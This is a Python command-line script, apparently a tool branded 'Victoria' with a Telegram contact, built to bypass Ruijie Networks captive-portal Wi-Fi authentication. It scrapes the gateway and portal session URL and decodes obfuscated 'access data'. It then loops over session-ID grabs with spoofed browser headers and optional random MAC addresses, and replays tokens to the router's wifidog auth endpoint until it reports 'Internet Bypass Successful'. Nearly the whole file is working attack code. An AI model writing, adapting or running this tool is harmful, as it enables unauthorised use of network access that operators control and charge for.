import os
import re
import sys
import time
import base64
import random
import string
import urllib
import aiohttp
import asyncio
import requests
import argparse
from urllib.parse import unquote

# Try to import ping3, but handle if not installed
try:
    import ping3
except ImportError:
    ping3 = None

def clear():
    os.system("clear")

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def Line():
    try:
        cols = os.get_terminal_size()[0]
    except:
        cols = 50
    print(f"{y}-\033[1;00m"*cols)

def Logo():
    clear()
    logo = f"""{b} __      ___      _             _       
 \ \    / (_)    | |           (_)      
  \ \  / / _  ___| |_ ___  _ __ _  __ _ 
   \ \/ / | |/ __| __/ _ \| '__| |/ _` |
    \  /  | | (__| || (_) | |  | | (_| |
     \/   |_|\___|\__\___/|_|  |_|\__,_|{w}"""
    print(logo)
    Line()
    print(f"{g}[+] Telegram: @hcawi")
    print(f"{w}[*] This tool is only for Ruijie Network Router")
    Line()

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", help="features option", choices=["internet", "setup"], required=True)
    args = parser.parse_args() 
    option = args.option

    if option == "internet":
        asyncio.run(InternetAccess().main())
    elif option == "setup":
        Setup().set()

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id, rep_mac=True):
    if rep_mac:
        mac = get_mac()
        session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return False
    except:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        Logo()
        try:
            self.ip = open('.ip', 'r').read().strip()
        except FileNotFoundError:
            print(f"{r}[!] IP not found, try again after setup")
            sys.exit(0)
        try:
           access_data = open('.access_data', 'r').read().strip()
        except FileNotFoundError:
            access_data = input(f"{g}[+] Enter Your Access Data: ")
        Logo()
        self.decode_access_data = self.decode_data(access_data)
    
    async def main(self):
        await execute(self.decode_access_data, self.ip)

    def decode_data(self, access_data):
        try:
            rm_extra64 = access_data[6:-3].encode()
            dec_64 = base64.b64decode(rm_extra64)
            rm_extra85 = dec_64[12:-9]
            decode_access_data = base64.a85decode(rm_extra85).decode()
            dec_data, uid = decode_access_data.split("WHOAMI")
            with open(".access_data", "w") as f:
                f.write(access_data)
            return dec_data
        except Exception as er:
            print(f"{r}[!] Access Data Error, Please Check Your Access Data")
            sys.exit(0)
    
async def get_ping():
    if ping3 is None:
        return f"{y}ping3 not installed{w}"
    ping = await asyncio.to_thread(ping3.ping, "google.com")
    if ping is None:
        return f"{r}Unknown{w}"
    else:
        ping = int(ping * 1000)
        if ping >= 100:
            return f"{r}{str(ping)}{w}"
        elif ping >= 90:
            return f"{y}{str(ping)}{w}"
        elif ping < 90:
            return f"{g}{str(ping)}{w}"

async def execute(decode_access_data, ip):
    timeout = aiohttp.ClientTimeout(total=20)
    connector = aiohttp.TCPConnector(limit=1024)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        try:
            while True:
                previous_session_id = None
                while True:
                    print(f"{g}[*] Getting session id...")
                    Line()
                    session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    if session_id is False:
                        print(f"{y}[!] Session ID Not Found")
                        Line()
                        print(f"{y}[*] Will Try Again After 100 seconds")
                        Line()
                        time.sleep(100)
                        session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    elif session_id is None:
                        print(f"{y}[!] Session ID Not Found")
                        Line()
                        print(f"{y}[*] Will Try Again After 5 seconds")
                        Line()
                        time.sleep(5)
                        session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    elif session_id:
                        previous_session_id = session_id
                        print(f"{g}[+] Found Session ID: {session_id}")
                        Line()
                        break
                for i in range(3):
                    send_status = await send(session, ip, session_id)
                    if not send_status:
                        print(f"{r}[!] Internet Bypass Failed, Session Url May Expired")
                        Line()
                        print(f"{g}[+] Getting Ping...")
                        Line()
                        ping = await get_ping()
                        print(f"{b}[*] Current Ping is {ping}")
                        Line()
                    else:
                        print(f"{g}[+] Internet Bypass Successful")
                        Line()
                        print(f"{g}[+] Getting Ping...")
                        Line()
                        ping = await get_ping()
                        print(f"{b}[*] Current Ping is {ping}")
                        Line()
                    time.sleep(10)
                time.sleep(5)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        except Exception as e:
            print(f"{r}[!] Process was stopped: {e}")
            sys.exit(0)
    
async def send(session, ip, session_id):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'token': session_id,
        'phoneNumber': 'HELLO WORLD',
    }
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "http://www.baidu.com" == response or "http://www.baidu.com/" == response or "http://portal-as.ruijienetworks.com/download/static/maccauth/src/success.html?" in response:
                return True
            else:
                return False
    except Exception as e:
        print(f"{y}[!] Sending Packages fail")
        Line()
        time.sleep(1.5)
        print(f"{y}[*] Trying to Send Again...")
        Line()
        time.sleep(1.5)
        return await send(session, ip, session_id)

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)       
    return url

class Setup:
    def set(self):
        Logo()
        try:
            localhost = requests.get("http://192.168.0.1",timeout=10).url
            ip = re.search('gw_address=(.*?)&', localhost).group(1)
            headers = {
                'authority': 'portal-as.ruijienetworks.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': localhost,
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            req = requests.get(localhost, headers=headers).text
            session_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", req).group(1)
            open(".session_url", "w").write(session_url)
            open(".ip", "w").write(ip)
            Line()
            print(f"{g}[+] Setup success")
        except Exception as err:
            Line()
            print(f"{r}[!] Setup failed, Error info: {err.__class__.__name__}")
            sys.exit(0)

if __name__ == "__main__":
    feature()
